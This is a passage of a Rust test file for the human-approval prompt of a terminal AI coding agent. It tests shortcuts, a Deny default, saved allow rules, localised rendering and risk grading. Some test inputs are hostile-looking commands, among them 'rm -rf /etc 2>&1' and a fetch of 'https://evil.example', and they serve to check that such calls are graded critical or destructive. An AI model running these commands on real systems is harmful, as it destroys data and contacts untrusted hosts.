    assert_eq!(view.current_option(), ApprovalOption::Deny);

    view.select_next();
    assert_eq!(view.current_option(), ApprovalOption::Abort);
    view.select_next();
    assert_eq!(view.current_option(), ApprovalOption::ApproveOnce);
    view.select_next();
    assert_eq!(view.current_option(), ApprovalOption::ApproveAlways);

    // Continue through the semantic default rather than dead-ending (#4755).
    view.select_next();
    assert_eq!(view.current_option(), ApprovalOption::Deny);

    // And back through the same order the other way.
    view.select_prev();
    assert_eq!(view.current_option(), ApprovalOption::ApproveAlways);

    view.select_prev();
    assert_eq!(view.current_option(), ApprovalOption::ApproveOnce);
}

#[test]
fn benign_y_one_step_approves() {
    for code in [KeyCode::Char('y'), KeyCode::Char('Y')] {
        let mut view = ApprovalView::new(benign_request());
        let action = view.handle_key(create_key_event(code));
        assert!(
            matches!(
                action,
                ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
                    decision: ReviewDecision::Approved,
                    ..
                })
            ),
            "expected Approved for {code:?}"
        );
    }
}

#[test]
fn save_ask_rule_shortcut_approves_once_with_rule() {
    let mut view = ApprovalView::new(shell_request());
    render_lines(&view, 120, 40);

    let action = view.handle_key(create_key_event(KeyCode::Char('s')));
    let ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
        decision,
        persistent_rules,
        ..
    }) = action
    else {
        panic!("expected approval decision");
    };

    assert_eq!(decision, ReviewDecision::Approved);
    assert_eq!(
        persistent_rules,
        vec![ToolAskRule::exec_shell("cargo test --workspace")]
    );
}

#[test]
fn save_file_ask_rule_shortcut_emits_file_rule() {
    // `S` on a write_file approval approves once and carries the exact
    // workspace-relative file rule for persistence.
    let mut view = ApprovalView::new(destructive_request());
    render_lines(&view, 120, 40);

    let action = view.handle_key(create_key_event(KeyCode::Char('S')));
    let ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
        decision,
        persistent_rules,
        ..
    }) = action
    else {
        panic!("expected approval decision");
    };

    assert_eq!(decision, ReviewDecision::Approved);
    assert_eq!(
        persistent_rules,
        vec![ToolAskRule::file_path("write_file", "src/main.rs")]
    );
}

#[test]
fn persistent_allow_option_approves_once_with_exact_repo_rule() {
    let mut view = ApprovalView::new(shell_request());
    render_lines(&view, 120, 40);

    let action = view.handle_key(create_key_event(KeyCode::Char('p')));
    let ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
        decision,
        persistent_rules,
        ..
    }) = action
    else {
        panic!("expected approval decision");
    };

    assert_eq!(decision, ReviewDecision::Approved);
    assert_eq!(
        persistent_rules,
        vec![
            ToolAskRule::exec_shell("cargo test --workspace")
                .into_exact_workspace_allow("/workspace")
        ]
    );
}

/// The save offers work only while the card shows what the rule covers:
/// never before the first paint, never on a band too small for the save
/// preview, never while collapsed to its banner.
#[test]
fn save_shortcuts_fail_closed_while_the_save_preview_is_off_screen() {
    let saves = |view: &mut ApprovalView| {
        [KeyCode::Char('p'), KeyCode::Char('s')].map(|code| {
            matches!(
                view.clone().handle_key(create_key_event(code)),
                ViewAction::EmitAndClose(ViewEvent::ApprovalDecision { .. })
            )
        })
    };
    let mut view = ApprovalView::new(shell_request());
    assert_eq!(saves(&mut view), [false, false], "before the first paint");

    render_lines(&view, 120, 40);
    assert_eq!(saves(&mut view), [true, true], "preview on screen");

    let lines = render_lines(&view, 40, 9).join("\n");
    assert!(!lines.contains("Save:"), "{lines}");
    assert!(!lines.contains("[p]"), "{lines}");
    assert_eq!(saves(&mut view), [false, false], "band too small: {lines}");

    render_lines(&view, 120, 40);
    view.handle_key(create_key_event(KeyCode::Tab));
    render_lines(&view, 120, 40);
    assert_eq!(saves(&mut view), [false, false], "collapsed banner");
}

/// With the save offer hidden, arrow keys skip its row and a stale selection
/// on it commits nothing.
#[test]
fn hidden_save_offer_is_skipped_by_navigation_and_enter() {
    let mut view = ApprovalView::new(shell_request());
    render_lines(&view, 120, 40);
    view.select_prev();
    assert_eq!(view.current_option(), ApprovalOption::AllowExactRepo);

    render_lines(&view, 40, 9);
    assert!(matches!(
        view.handle_key(create_key_event(KeyCode::Enter)),
        ViewAction::None
    ));
    view.select_prev();
    assert_eq!(view.current_option(), ApprovalOption::ApproveAlways);
    view.select_next();
    assert_eq!(view.current_option(), ApprovalOption::Deny);
}

#[test]
fn persistent_allow_shortcut_is_ignored_for_dangerous_command() {
    let request = critical_request();
    assert!(request.persistent_allow_rules.is_empty());
    let mut view = ApprovalView::new(request);

    assert!(matches!(
        view.handle_key(create_key_event(KeyCode::Char('p'))),
        ViewAction::None
    ));
}

#[test]
fn repo_law_request_does_not_build_a_persistent_allow_candidate() {
    let request = ApprovalRequest::new(
        "test-id",
        "edit_file",
        "Repo law holds this write: protected path (matched Cargo.toml, .codewhale/constitution.json)",
        &json!({"path": "Cargo.toml", "old": "a", "new": "b"}),
        "tool:edit_file",
    );

    assert!(request.is_repo_law_prompt());
    assert!(request.persistent_allow_rules.is_empty());
    assert!(!request.can_save_allow_rule());
    assert_eq!(request.allow_rule_save_preview(), None);
}

#[test]
fn save_ask_rule_shortcut_is_ignored_without_rule() {
    let mut view = ApprovalView::new(benign_request());

    let action = view.handle_key(create_key_event(KeyCode::Char('s')));

    assert!(matches!(action, ViewAction::None));
}

#[test]
fn benign_one_key_approves_via_numeric_pad() {
    let mut view = ApprovalView::new(benign_request());
    let action = view.handle_key(create_key_event(KeyCode::Char('1')));
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Approved,
            ..
        })
    ));
}

#[test]
fn benign_enter_denies_by_default() {
    let mut view = ApprovalView::new(benign_request());
    let action = view.handle_key(create_key_event(KeyCode::Enter));
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Denied,
            ..
        })
    ));
}

#[test]
fn mouse_click_renders_and_approves_inline_option() {
    let mut view = ApprovalView::new(benign_request());
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).expect("test terminal");
    terminal
        .draw(|frame| view.render(frame.area(), frame.buffer_mut()))
        .expect("render approval prompt");
    let rect = view.row_hitboxes.borrow()[0];
    let action = view.handle_mouse(MouseEvent {
        kind: MouseEventKind::Down(MouseButton::Left),
        column: rect.x,
        row: rect.y,
        modifiers: KeyModifiers::NONE,
    });
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Approved,
            ..
        })
    ));
}

/// A tiny frame keeps every one-off action and its hitbox. Where it has no
/// room for the save preview (most locales at 40x12) it withholds the
/// persistent save (`[p]`, index 2): its hitbox is empty and nothing clicks
/// it. Where it offers the save, the preview is on screen.
#[test]
fn tiny_localized_approval_keeps_every_action_and_hitbox() {
    const WIDTH: u16 = 40;
    const HEIGHT: u16 = 12;
    const PERSISTENT: usize = 2;
    let expected = [
        ReviewDecision::Approved,
        ReviewDecision::ApprovedForSession,
        ReviewDecision::Approved,
        ReviewDecision::Denied,
        ReviewDecision::Abort,
    ];

    for &locale in Locale::shipped() {
        let rendered_view = ApprovalView::new_for_locale(destructive_request(), locale);
        let rendered = render_lines(&rendered_view, WIDTH, HEIGHT).join("\n");
        assert_approval_key_badges_visible(&rendered);
        assert!(
            rendered.contains(crate::tui::shell_key_routing::tool_details_chord().as_ref()),
            "missing details chord for {locale:?}:\n{rendered}"
        );

        for (index, expected_decision) in expected.iter().enumerate() {
            let mut view = ApprovalView::new_for_locale(destructive_request(), locale);
            let mut terminal =
                Terminal::new(TestBackend::new(WIDTH, HEIGHT)).expect("test terminal");
            terminal
                .draw(|frame| view.render(frame.area(), frame.buffer_mut()))
                .expect("render localized approval prompt");

            let hitboxes = view.row_hitboxes.borrow().clone();
            assert_eq!(hitboxes.len(), expected.len(), "{locale:?}: {hitboxes:?}");
            let offered = hitboxes[PERSISTENT] != ratatui::layout::Rect::default();
            let screen = terminal.backend().buffer().clone();
            let text: String = screen.content.iter().map(|cell| cell.symbol()).collect();
            assert_eq!(offered, text.contains("Save:"), "{locale:?}:\n{text}");
            let shown: Vec<ratatui::layout::Rect> = hitboxes
                .iter()
                .enumerate()
                .filter(|(i, _)| offered || *i != PERSISTENT)
                .map(|(_, rect)| *rect)
                .collect();
            for hitbox in &shown {
                assert!(hitbox.height > 0, "{locale:?}: {hitboxes:?}");
                assert!(hitbox.right() <= WIDTH, "{locale:?}: {hitboxes:?}");
                assert!(hitbox.bottom() <= HEIGHT, "{locale:?}: {hitboxes:?}");
            }
            for pair in shown.windows(2) {
                assert!(pair[0].bottom() <= pair[1].y, "{locale:?}: {hitboxes:?}");
            }
            if index == PERSISTENT && !offered {
                assert!(
                    matches!(
                        view.handle_key(create_key_event(KeyCode::Char('p'))),
                        ViewAction::None
                    ),
                    "{locale:?}: [p] without its save preview"
                );
                continue;
            }

            let rect = hitboxes[index];
            let action = view.handle_mouse(MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: rect.x,
                row: rect.y,
                modifiers: KeyModifiers::NONE,
            });
            let ViewAction::EmitAndClose(ViewEvent::ApprovalDecision { decision, .. }) = action
            else {
                panic!("click {index} did not decide for {locale:?}");
            };
            assert_eq!(decision, *expected_decision, "{locale:?} option {index}");
        }
    }
}

#[test]
fn benign_a_two_approves_for_session() {
    for code in [KeyCode::Char('a'), KeyCode::Char('A'), KeyCode::Char('2')] {
        let mut view = ApprovalView::new(benign_request());
        let action = view.handle_key(create_key_event(code));
        assert!(
            matches!(
                action,
                ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
                    decision: ReviewDecision::ApprovedForSession,
                    ..
                })
            ),
            "expected ApprovedForSession for {code:?}"
        );
    }
}

#[test]
fn benign_n_d_three_all_deny() {
    for code in [
        KeyCode::Char('n'),
        KeyCode::Char('N'),
        KeyCode::Char('d'),
        KeyCode::Char('D'),
        KeyCode::Char('3'),
    ] {
        let mut view = ApprovalView::new(benign_request());
        let action = view.handle_key(create_key_event(code));
        assert!(
            matches!(
                action,
                ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
                    decision: ReviewDecision::Denied,
                    ..
                })
            ),
            "expected Denied for {code:?}"
        );
    }
}

#[test]
fn benign_esc_aborts() {
    let mut view = ApprovalView::new(benign_request());
    let action = view.handle_key(create_key_event(KeyCode::Esc));
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Abort,
            ..
        })
    ));
}

#[test]
fn test_approval_view_enter_uses_selected_option() {
    let mut view = ApprovalView::new(benign_request());

    // The semantic default is Deny; navigate once to Abort and commit it.
    view.select_next();
    assert_eq!(view.current_option(), ApprovalOption::Abort);

    let action = view.handle_key(create_key_event(KeyCode::Enter));
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Abort,
            ..
        })
    ));
}

#[test]
fn test_approval_view_navigation_keys() {
    let mut view = ApprovalView::new(benign_request());

    view.handle_key(create_key_event(KeyCode::Up));
    assert_eq!(view.current_option(), ApprovalOption::ApproveAlways);

    view.handle_key(create_key_event(KeyCode::Down));
    assert_eq!(view.current_option(), ApprovalOption::Deny);

    view.handle_key(create_key_event(KeyCode::Down));
    assert_eq!(view.current_option(), ApprovalOption::Abort);

    view.handle_key(create_key_event(KeyCode::Char('j')));
    assert_eq!(view.current_option(), ApprovalOption::ApproveOnce);

    view.handle_key(create_key_event(KeyCode::Char('k')));
    assert_eq!(view.current_option(), ApprovalOption::Abort);
}

#[test]
fn approval_modified_chords_and_nonpress_keys_cannot_answer() {
    for request in [benign_request(), shell_request(), destructive_request()] {
        let mut view = ApprovalView::new(request);
        // Saving is available and has actually been painted: rejecting these
        // chords must come from input admission, not an off-screen preview.
        render_lines(&view, 120, 40);
        for modifiers in [
            KeyModifiers::ALT,
            KeyModifiers::CONTROL,
            KeyModifiers::SUPER,
        ] {
            for modifiers in [modifiers, modifiers | KeyModifiers::SHIFT] {
                for code in "yaYAsSpPnNdDeEgG123jk".chars().map(KeyCode::Char).chain([
                    KeyCode::Enter,
                    KeyCode::Up,
                    KeyCode::Down,
                    KeyCode::Tab,
                    KeyCode::Esc,
                ]) {
                    let selected = view.selected;
                    let collapsed = view.collapsed;
                    assert!(
                        matches!(
                            view.handle_key(KeyEvent::new(code, modifiers)),
                            ViewAction::None
                        ),
                        "{code:?} with {modifiers:?}"
                    );
                    assert_eq!(view.selected, selected);
                    assert_eq!(view.collapsed, collapsed);
                }
            }
        }
        for kind in [
            crossterm::event::KeyEventKind::Repeat,
            crossterm::event::KeyEventKind::Release,
        ] {
            for code in [
                KeyCode::Char('y'),
                KeyCode::Char('a'),
                KeyCode::Char('s'),
                KeyCode::Char('p'),
                KeyCode::Enter,
            ] {
                let mut key = create_key_event(code);
                key.kind = kind;
                assert!(matches!(view.handle_key(key), ViewAction::None));
            }
        }
    }
}

#[test]
fn test_approval_view_view_params() {
    // Bare `v` must not open details (TUI-DOG-002).
    let mut view = ApprovalView::new(benign_request());
    let action = view.handle_key(create_key_event(KeyCode::Char('v')));
    assert!(matches!(action, ViewAction::None));

    let mut view = ApprovalView::new(benign_request());
    let action = view.handle_key(create_key_event(KeyCode::Char('V')));
    assert!(matches!(action, ViewAction::None));

    // Alt+V / Option+V opens the params pager.
    let mut view = ApprovalView::new(benign_request());
    let action = view.handle_key(KeyEvent::new(KeyCode::Char('v'), KeyModifiers::ALT));
    assert!(matches!(
        action,
        ViewAction::Emit(ViewEvent::OpenTextPager { .. })
    ));
    if cfg!(target_os = "macos") {
        assert!(matches!(
            view.handle_key(create_key_event(KeyCode::Char('√'))),
            ViewAction::Emit(ViewEvent::OpenTextPager { .. })
        ));
    }
}

#[test]
fn edit_file_details_pager_includes_complete_search_replace_preview() {
    let request = ApprovalRequest::new(
        "test-id",
        "edit_file",
        "Edit a file on disk",
        &json!({
            "path": "src/lib.rs",
            "search": "  old_1();\r\n\told_2();\nold  3();\nold_4();\nold_5();\n",
            "replace": "\tnew_1();\nnew  2();\r\nnew_3();\nnew_4();\nnew_5();"
        }),
        "tool:edit_file",
    );
    let mut view = ApprovalView::new(request);

    let action = view.handle_key(KeyEvent::new(KeyCode::Char('v'), KeyModifiers::ALT));
    let ViewAction::Emit(ViewEvent::OpenTextPager { content, .. }) = action else {
        panic!("Alt+V should open the edit details pager");
    };

    let expected_preview = [
        "Preview:",
        "replace this",
        "- \"\\x20\\x20old_1();\\r\\n\"",
        "- \"\\told_2();\\n\"",
        "- \"old\\x20\\x203();\\n\"",
        "- \"old_4();\\n\"",
        "- \"old_5();\\n\"",
        "with this",
        "+ \"\\tnew_1();\\n\"",
        "+ \"new\\x20\\x202();\\r\\n\"",
        "+ \"new_3();\\n\"",
        "+ \"new_4();\\n\"",
        "+ \"new_5();\"",
    ]
    .join("\n");
    assert!(
        content.contains(&expected_preview),
        "details pager omitted part of the edit preview:\n{content}"
    );

    let pager = crate::tui::pager::PagerView::from_text("Tool Params", &content, 200);
    let displayed = pager.body_text();
    assert!(
        displayed.contains(&expected_preview),
        "details pager display changed exact whitespace or line endings:\n{displayed}"
    );
}

#[test]
fn edit_file_details_pager_localizes_preview_headers_for_every_locale() {
    for &locale in Locale::shipped() {
        let request = ApprovalRequest::new(
            "test-id",
            "edit_file",
            "Edit a file on disk",
            &json!({
                "path": "src/lib.rs",
                "search": "old();",
                "replace": "new();"
            }),
            "tool:edit_file",
        );
        let mut view = ApprovalView::new_for_locale(request, locale);

        let action = view.handle_key(KeyEvent::new(KeyCode::Char('v'), KeyModifiers::ALT));
        let ViewAction::Emit(ViewEvent::OpenTextPager { content, .. }) = action else {
            panic!("Alt+V should open the edit details pager for {locale:?}");
        };
        let expected_headers = format!(
            "{}:\n{}\n- \"old();\"\n{}\n+ \"new();\"",
            tr(locale, MessageId::ApprovalLabelPreview),
            tr(locale, MessageId::ApprovalLabelReplaceThis),
            tr(locale, MessageId::ApprovalLabelWithThis),
        );

        assert!(
            content.contains(&expected_headers),
            "details pager did not localize edit preview headers for {locale:?}:\n{content}"
        );
    }
}

#[test]
fn test_approval_view_current_decision_mapping() {
    let mut view = ApprovalView::new(benign_request());

    view.selected = 0;
    assert_eq!(view.current_decision(), ReviewDecision::Approved);
    view.selected = 1;
    assert_eq!(view.current_decision(), ReviewDecision::ApprovedForSession);
    view.selected = 2;
    assert_eq!(view.current_decision(), ReviewDecision::Denied);
    view.selected = 3;
    assert_eq!(view.current_decision(), ReviewDecision::Abort);
}

/// One request per row ordering in `ApprovalOption::order_for`, so an
/// index-based default would be caught drifting on at least one of them.
fn one_request_per_card_shape() -> Vec<ApprovalRequest> {
    vec![
        benign_request(),
        shell_request(),
        ApprovalRequest::new(
            "wf-default",
            "workflow",
            "Launch workflow",
            &json!({
                "action": "start",
                "plan": {
                    "goal": "risky",
                    "risk": "elevated",
                    "children": [{ "prompt": "go", "type": "implementer" }]
                }
            }),
            "tool:workflow",
        ),
    ]
}

#[test]
fn default_selection_denies_on_every_card_shape() {
    for request in one_request_per_card_shape() {
        let view = ApprovalView::new_for_locale(request, Locale::En);
        assert_eq!(view.current_option(), ApprovalOption::Deny);
    }
}

#[test]
fn allow_once_default_selection_preselects_approve_once() {
    for request in one_request_per_card_shape() {
        let view = ApprovalView::new_with_default_selection(
            request,
            Locale::En,
            ApprovalDefaultSelection::AllowOnce,
        );
        assert_eq!(view.current_option(), ApprovalOption::ApproveOnce);
        assert_eq!(view.current_decision(), ReviewDecision::Approved);
    }
}

#[test]
fn approval_config_resolves_default_selection() {
    let bare: crate::config::Config = toml::from_str("").expect("empty config");
    assert_eq!(
        bare.approval_default_selection(),
        ApprovalDefaultSelection::Deny
    );

    let opted_in: crate::config::Config =
        toml::from_str("[approval]\ndefault_selection = \"allow_once\"").expect("approval table");
    assert_eq!(
        opted_in.approval_default_selection(),
        ApprovalDefaultSelection::AllowOnce
    );

    assert!(
        toml::from_str::<crate::config::Config>("[approval]\ndefault_selection = \"allow_always\"")
            .is_err()
    );
}

// ========================================================================
// ApprovalView Tests — Destructive Variant (one-step approve with warning)
// ========================================================================

#[test]
fn destructive_request_routes_destructive() {
    let view = ApprovalView::new(destructive_request());
    assert_eq!(view.risk(), RiskLevel::Destructive);
}

#[test]
fn destructive_y_first_press_approves_once() {
    for code in [KeyCode::Char('y'), KeyCode::Char('Y')] {
        let mut view = ApprovalView::new(destructive_request());

        let action = view.handle_key(create_key_event(code));
        assert!(
            matches!(
                action,
                ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
                    decision: ReviewDecision::Approved,
                    ..
                })
            ),
            "expected Approved for {code:?}"
        );
    }
}

#[test]
fn destructive_enter_denies_by_default() {
    let mut view = ApprovalView::new(destructive_request());

    // The persistent-allow row changes numeric indices, but the semantic
    // default still starts at Deny.
    assert_eq!(view.current_option(), ApprovalOption::Deny);
    let action = view.handle_key(create_key_event(KeyCode::Enter));
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Denied,
            ..
        })
    ));
}

#[test]
fn destructive_navigation_then_enter_commits_highlighted_abort() {
    let mut view = ApprovalView::new(destructive_request());

    view.handle_key(create_key_event(KeyCode::Down));
    assert_eq!(view.current_option(), ApprovalOption::Abort);
    let action = view.handle_key(create_key_event(KeyCode::Enter));
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Abort,
            ..
        })
    ));
}

#[test]
fn destructive_unrelated_key_keeps_modal_open() {
    let mut view = ApprovalView::new(destructive_request());

    let action = view.handle_key(create_key_event(KeyCode::Char('q')));
    assert!(matches!(action, ViewAction::None));
}

#[test]
fn destructive_a_first_press_approves_for_session() {
    for code in [KeyCode::Char('a'), KeyCode::Char('A')] {
        let mut view = ApprovalView::new(destructive_request());

        let action = view.handle_key(create_key_event(code));
        assert!(
            matches!(
                action,
                ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
                    decision: ReviewDecision::ApprovedForSession,
                    ..
                })
            ),
            "expected ApprovedForSession for {code:?}"
        );
    }
}

#[test]
fn destructive_deny_commits_immediately() {
    // Deny commits immediately — the user is rejecting the tool.
    for code in [
        KeyCode::Char('n'),
        KeyCode::Char('N'),
        KeyCode::Char('d'),
        KeyCode::Char('D'),
    ] {
        let mut view = ApprovalView::new(destructive_request());
        let action = view.handle_key(create_key_event(code));
        assert!(
            matches!(
                action,
                ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
                    decision: ReviewDecision::Denied,
                    ..
                })
            ),
            "expected Denied for {code:?}"
        );
    }
}

#[test]
fn destructive_esc_aborts_immediately() {
    let mut view = ApprovalView::new(destructive_request());
    let action = view.handle_key(create_key_event(KeyCode::Esc));
    assert!(matches!(
        action,
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Abort,
            ..
        })
    ));
}

// ========================================================================
// Render approval-card smoke tests — keep the visual contract honest.
// ========================================================================

fn render_lines(view: &ApprovalView, w: u16, h: u16) -> Vec<String> {
    use ratatui::buffer::Buffer;
    use ratatui::layout::Rect;
    let mut buf = Buffer::empty(Rect::new(0, 0, w, h));
    ModalView::render(view, Rect::new(0, 0, w, h), &mut buf);
    (0..buf.area.height)
        .map(|row| {
            (0..buf.area.width)
                .map(|col| buf[(col, row)].symbol().to_string())
                .collect::<String>()
        })
        .collect()
}

fn compact_rendered_text(lines: &[String]) -> String {
    lines.join("\n").replace(' ', "")
}

fn assert_approval_key_badges_visible(joined: &str) {
    for badge in ["[1 / y]", "[2 / a]", "[3 / d / n]", "[Esc]"] {
        assert!(
            joined.contains(badge),
            "missing key badge {badge}:\n{joined}"
        );
    }
}

#[test]
fn web_run_risk_is_param_aware() {
    // search/query is benign; open/click fetch arbitrary URLs -> destructive.
    assert_eq!(
        classify_risk("web_run", ToolCategory::Network, &json!({"search": "rust"})),
        RiskLevel::Benign
    );
    assert_eq!(
        classify_risk(
            "web_run",
            ToolCategory::Network,
            &json!({"open": [{"ref": "https://evil.example"}]})
        ),
        RiskLevel::Destructive
    );
    assert_eq!(
        classify_risk(
            "web_run",
            ToolCategory::Network,
            &json!({"click": [{"ref": "1"}]})
        ),
        RiskLevel::Destructive
    );
}

#[test]
fn stakes_split_routine_elevated_critical() {
    assert_eq!(benign_request().stakes(), ApprovalStakes::Routine);
    assert_eq!(destructive_request().stakes(), ApprovalStakes::Elevated);
    assert_eq!(shell_request().stakes(), ApprovalStakes::Elevated);
    assert_eq!(critical_request().stakes(), ApprovalStakes::Critical);
    // Publish-like shell is critical in every origin.
    let publish = ApprovalRequest::new(
        "test-id",
        "exec_shell",
        "Run a shell command",
        &json!({"command": "git push origin main"}),
        "tool:exec_shell",
    );
    assert_eq!(publish.stakes(), ApprovalStakes::Critical);
}

#[test]
fn stderr_redirect_does_not_change_the_effect_badge() {
    // The same test run must read the same however the model spells it.
    let run = |command: &str| {
        ApprovalRequest::new(
            "test-id",
            "exec_shell",
            "Run a shell command",
            &json!({ "command": command }),
            "tool:exec_shell",
        )
    };
    for command in [
        "npm test",
        "npm test 2>&1",
        "npm test 2>&1 | tail -20",
        "cargo build > /dev/null 2>&1",
    ] {
        let request = run(command);
        assert_eq!(request.stakes(), ApprovalStakes::Elevated, "{command}");
        let joined = render_lines(&ApprovalView::new(request), 100, 40).join("\n");
        assert!(joined.contains("Runs a command"), "{command}:\n{joined}");
        assert!(!joined.contains("Can't be undone"), "{command}:\n{joined}");
    }
    // A redirect does not hide a destructive command either.
    assert_eq!(run("rm -rf /etc 2>&1").stakes(), ApprovalStakes::Critical);
}

#[test]
fn highlighted_option_row_names_enter() {
    // Deny is highlighted by default (#5293). The row says so, so a newcomer
    // sees that Enter refuses and `y` allows.
    let tagged = |view: &ApprovalView| {
        render_lines(view, 100, 40)
            .into_iter()
            .filter(|line| line.contains("(Enter)"))
            .collect::<Vec<_>>()
    };
    let rows = tagged(&ApprovalView::new(shell_request()));
    assert_eq!(rows.len(), 1, "{rows:?}");
    assert!(
        rows[0].contains("[3 / d / n] Don't allow (Enter)"),
        "{rows:?}"
    );

    // The tag follows the highlight; it is not a claim about Deny.
    let rows = tagged(&ApprovalView::new_with_default_selection(
        shell_request(),
        Locale::En,
        ApprovalDefaultSelection::AllowOnce,
    ));
    assert_eq!(rows.len(), 1, "{rows:?}");
    assert!(rows[0].contains("[1 / y] Allow once (Enter)"), "{rows:?}");

    // The default Deny row still fits one 40-column row in every language,
    // so the tag never pushes a control off a narrow band.
    for &locale in Locale::shipped() {
        let view = ApprovalView::new_for_locale(shell_request(), locale);
        let rows = tagged(&view);
        assert_eq!(rows.len(), 1, "{locale:?}: {rows:?}");
        let narrow = render_lines(&view, 40, 40)
            .into_iter()
            .filter(|line| line.contains("(Enter)"))
            .count();
        assert_eq!(narrow, 1, "{locale:?}: the tag wrapped at 40 columns");
    }
}

#[test]
fn agent_tool_is_classified_and_renders_calm() {
    assert_eq!(get_tool_category("agent"), ToolCategory::Agent);

    let request = ApprovalRequest::new(
        "test-id",
        "agent",
        "Start a sub-agent",
        &json!({"action": "start", "type": "explore", "prompt": "map the workspace"}),
        "tool:agent",
    );
    assert_eq!(request.category, ToolCategory::Agent);
    assert_eq!(request.stakes(), ApprovalStakes::Elevated);

    let view = ApprovalView::new(request);
    let lines = render_lines(&view, 100, 40);
    let joined = lines.join("\n");
    assert!(joined.contains("Starts an agent"), "{joined}");
    assert!(!joined.contains("Can't be undone"), "{joined}");
    assert!(
        !joined.contains("not classified"),
        "agent must not render the unknown-tool warning:\n{joined}"
    );
    assert!(joined.contains("Action"), "{joined}");
    assert!(joined.contains("start"), "{joined}");
    assert!(joined.contains("explore"), "{joined}");
    assert!(joined.contains("map the workspace"), "{joined}");
}

#[test]
fn agent_status_and_peek_are_benign() {
    for action in ["status", "peek", "list"] {
        let request = ApprovalRequest::new(
            "test-id",
            "agent",
            "Inspect a sub-agent",
            &json!({"action": action, "agent_id": "agent_1"}),
            "tool:agent",
        );
        assert_eq!(request.risk, RiskLevel::Benign, "{action}");
        assert_eq!(request.stakes(), ApprovalStakes::Routine, "{action}");
    }
}

#[test]
fn render_benign_includes_review_badge_and_selection_hint() {
    let view = ApprovalView::new(benign_request());
    let lines = render_lines(&view, 100, 40);
    let joined = lines.join("\n");
    assert!(
        joined.contains("Reads only"),
        "missing effect badge:\n{joined}"
    );
    // The card leads with the plain summary, workspace-relative (E6).
    assert!(joined.contains("Read src/main.rs"), "{joined}");
    assert_approval_key_badges_visible(&joined);
    // The selection prose moved into the per-option key badges; the footer
    // keeps only the escape-hatch hints.
    assert!(
        joined.contains("Pg↑/↓ review"),
        "footer controls hint missing:\n{joined}"
    );
}

#[test]
fn approval_footer_hints_use_muted_contrast_tier() {
    // #3380: the footer key hints ("Pg↑/↓ review · Alt+V/⌥V details · Esc abort")
    // must render one contrast tier above TEXT_HINT — TEXT_MUTED, the same
    // color the app-wide ActionHint modal footers use for labels.
    use codewhale_palette as palette;
    use ratatui::buffer::Buffer;
    use ratatui::layout::Rect;

    let view = ApprovalView::new(benign_request());
    let (w, h) = (100u16, 40u16);
    let mut buf = Buffer::empty(Rect::new(0, 0, w, h));
    ModalView::render(&view, Rect::new(0, 0, w, h), &mut buf);

    let target: Vec<String> = "Pg↑/↓ review".chars().map(|c| c.to_string()).collect();
    let mut found = None;
    for y in 0..h {
        let symbols: Vec<String> = (0..w).map(|x| buf[(x, y)].symbol().to_string()).collect();
        for x in 0..=(w as usize - target.len()) {
            if symbols[x..x + target.len()] == target[..] {
                found = Some((u16::try_from(x).expect("column fits"), y));
            }
        }
    }
    let (x, y) = found.expect("footer key hints must be rendered");
    assert_eq!(
        buf[(x, y)].fg,
        palette::TEXT_MUTED,
        "footer key hints must use the muted (not hint) contrast tier"
    );
}

#[test]
fn render_elevated_write_is_calm_and_compact() {
    // Ordinary state-touching work (a file write) renders as a calm ask
    // that names its effect: no "Can't be undone" badge, no policy dossier,
    // no impact/category taxonomy — that detail stays one details chord away.
    let view = ApprovalView::new(destructive_request());
    let lines = render_lines(&view, 100, 40);
    let joined = lines.join("\n");
    assert!(
        joined.contains("Changes files"),
        "missing effect badge:\n{joined}"
    );
    assert!(
        !joined.contains("Can't be undone"),
        "routine write must not claim it is irreversible:\n{joined}"
    );
    assert_approval_key_badges_visible(&joined);
    assert!(
        joined.contains("Pg↑/↓ review"),
        "footer controls hint missing:\n{joined}"
    );
    assert!(
        !joined.contains("Your permissions"),
        "policy prose is critical-only:\n{joined}"
    );
    assert!(
        !joined.contains("Impact:"),
        "impact dossier is critical-only:\n{joined}"
    );
    assert!(
        !joined.contains("Type:"),
        "category taxonomy is critical-only:\n{joined}"
    );
    assert!(joined.contains("Write src/main.rs"), "{joined}");
}

#[test]
fn render_critical_shows_warning_badge_and_policy_semantics() {
    // Genuinely destructive work keeps the strong styling and the
    // policy/cancel semantics.
    let view = ApprovalView::new(critical_request());
    let lines = render_lines(&view, 100, 40);
    let joined = lines.join("\n");
    assert!(
        joined.contains("Can't be undone"),
        "missing irreversible badge:\n{joined}"
    );
    assert_approval_key_badges_visible(&joined);
    assert!(
        joined.contains("Your settings ask you to confirm this step first"),
        "missing permission/review-rule semantics:\n{joined}"
    );
    assert!(
        joined.contains("Don't allow skips only this step"),
        "missing don't-allow-vs-stop semantics:\n{joined}"
    );
    // Mark 4: no approval surface says Bash, MCP or abort.
    for banned in ["Bash", "MCP", "abort", "Abort"] {
        assert!(!joined.contains(banned), "{banned} on the card:\n{joined}");
    }
    assert!(joined.contains("rm -rf"));
}

#[test]
fn render_elevated_zh_hans_is_calm_and_localized() {
    let view = ApprovalView::new_for_locale(destructive_request(), Locale::ZhHans);
    let lines = render_lines(&view, 100, 40);
    let joined = compact_rendered_text(&lines);
    assert!(
        joined.contains("修改文件"),
